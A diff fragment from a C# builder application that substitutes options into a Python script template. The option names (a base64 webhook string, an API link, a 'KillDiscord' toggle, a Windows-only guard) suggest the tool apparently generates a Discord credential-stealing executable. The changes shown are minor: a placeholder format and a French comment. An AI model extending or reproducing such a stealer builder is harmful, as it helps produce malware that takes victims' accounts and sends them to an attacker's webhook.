@@ -3143,6 +3143,7 @@ if __name__ == ""__main__"" and os.name == ""nt"":
                 string baseFileName = ExeNameOutput.Text;
                 string pythonCode = pythonCodeTemplate;
 
+                // Remplacer les options dans le template Python
                 pythonCode = ReplaceOptionValue(pythonCode, "PC_CREATOR", Environment.UserName);
                 pythonCode = ReplaceOptionValue(pythonCode, "API_LINK", "");
                 pythonCode = ReplaceOptionValue(pythonCode, "B64_WBH_STR", B64_WBH_STR.Text);
@@ -3243,13 +3244,12 @@ if __name__ == ""__main__"" and os.name == ""nt"":
         // Méthode pour remplacer une valeur dans le template de code Python
         private string ReplaceOptionValue(string template, string option, string value)
         {
-            return template.Replace($"{{{{ {option} }}}}", value);
+            return template.Replace($"%{option}%", value);
         }
 
         private void build_script_Click(object sender, EventArgs e)
         {
             GenerateCustomPythonScript();
-
         }
 
         private void KillDiscord_Options_CheckedChanged(object sender, EventArgs e)
